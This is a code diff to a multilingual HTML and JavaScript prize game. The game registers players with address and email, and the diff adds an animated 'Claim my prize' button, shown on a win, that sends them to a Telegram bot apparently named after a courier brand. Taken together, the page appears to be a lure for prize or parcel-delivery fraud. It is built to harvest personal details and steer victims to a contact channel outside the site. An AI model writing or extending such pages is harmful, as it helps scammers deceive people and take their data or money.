@@ -81,6 +81,37 @@
   .form button:active { transform: scale(0.97); }
   .form button:disabled { opacity: 0.6; cursor: not-allowed; }
   .error { color: #f87171; font-size: 14px; margin-top: 8px; }
+
+  .claim-btn {
+    display: block;
+    width: 100%;
+    max-width: 400px;
+    padding: 18px;
+    margin-top: 20px;
+    border-radius: 12px;
+    border: none;
+    background: linear-gradient(145deg, #f59e0b, #d97706);
+    color: #fff;
+    font-size: 20px;
+    font-weight: bold;
+    cursor: pointer;
+    box-shadow: 0 6px 20px rgba(245, 158, 11, 0.4);
+    animation: pulse 1.5s infinite;
+    text-decoration: none;
+    text-align: center;
+  }
+  .claim-btn:active { transform: scale(0.97); }
+  @keyframes pulse {
+    0% { box-shadow: 0 6px 20px rgba(245, 158, 11, 0.4); }
+    50% { box-shadow: 0 6px 30px rgba(245, 158, 11, 0.8); }
+    100% { box-shadow: 0 6px 20px rgba(245, 158, 11, 0.4); }
+  }
+  .claim-hint {
+    font-size: 14px;
+    opacity: 0.7;
+    margin-top: 10px;
+    margin-bottom: 20px;
+  }
 </style>
 </head>
 <body>
@@ -115,6 +146,13 @@
   <div class="grid" id="grid"></div>
   <div id="sticker-container"></div>
   <p class="message" id="message"></p>
+
+  <a id="claim-btn" class="claim-btn hidden" href="https://t.me/Fedexpackage_bot?start=claim">
+    🏆 Réclamer mon lot
+  </a>
+  <p id="claim-hint" class="claim-hint hidden">
+    Cliquez ci-dessus pour réclamer votre lot
+  </p>
 </div>
 
 <script>
@@ -141,7 +179,9 @@ const TEXTS = {
     register_loading: "Vérification...",
     title: "🎁 Trouvez une case gagnante !",
     loading: "⏳ Chargement...",
-    error: "❌ Erreur"
+    error: "❌ Erreur",
+    claim_button: "🏆 Réclamer mon lot",
+    claim_hint: "Cliquez ci-dessus pour réclamer votre lot"
   },
   en: {
     register_title: "📝 Registration",
@@ -154,7 +194,9 @@ const TEXTS = {
     register_loading: "Verifying...",
     title: "🎁 Find a winning box!",
     loading: "⏳ Loading...",
-    error: "❌ Error"
+    error: "❌ Error",
+    claim_button: "🏆 Claim my prize",
+    claim_hint: "Click above to claim your prize"
   },
   ar: {
     register_title: "📝 التسجيل",
@@ -167,7 +209,9 @@ const TEXTS = {
     register_loading: "جار التحقق...",
     title: "🎁 اعثر على صندوق فائز!",
     loading: "⏳ جار التحميل...",
-    error: "❌ خطأ"
+    error: "❌ خطأ",
+    claim_button: "🏆 المطالبة بجائزتي",
+    claim_hint: "انقر أعلاه للمطالبة بجائزتك"
   },
   pt: {
     register_title: "📝 Registro",
@@ -180,7 +224,9 @@ const TEXTS = {
     register_loading: "Verificando...",
     title: "🎁 Encontre uma caixa vencedora!",
     loading: "⏳ Carregando...",
-    error: "❌ Erro"
+    error: "❌ Erro",
+    claim_button: "🏆 Reclamar meu prêmio",
+    claim_hint: "Clique acima para reclamar seu prêmio"
   },
   es: {
     register_title: "📝 Registro",
@@ -193,7 +239,9 @@ const TEXTS = {
     register_loading: "Verificando...",
     title: "🎁 ¡Encuentra una casilla ganadora!",
     loading: "⏳ Cargando...",
-    error: "❌ Error"
+    error: "❌ Error",
+    claim_button: "🏆 Reclamar mi premio",
+    claim_hint: "Haz clic arriba para reclamar tu premio"
   }
 };
 
@@ -208,6 +256,8 @@ document.getElementById("label-adresse").textContent = txt.register_adresse;
 document.getElementById("label-email").textContent = txt.register_email;
 document.getElementById("register-btn").textContent = txt.register_submit;
 document.getElementById("title").textContent = txt.title;
+document.getElementById("claim-btn").textContent = txt.claim_button;
+document.getElementById("claim-hint").textContent = txt.claim_hint;
 
 function showRegister() {
   document.getElementById("loading").classList.add("hidden");
@@ -337,6 +387,10 @@ async function playCase(index, btn) {
       showSticker("🎉");
       document.getElementById("message").textContent = data.message;
       disableAll();
+
+      document.getElementById("claim-btn").classList.remove("hidden");
+      document.getElementById("claim-hint").classList.remove("hidden");
+
     } else if (data.resultat === "perdu") {
       btn.classList.add("lose");
       showSticker("😢");
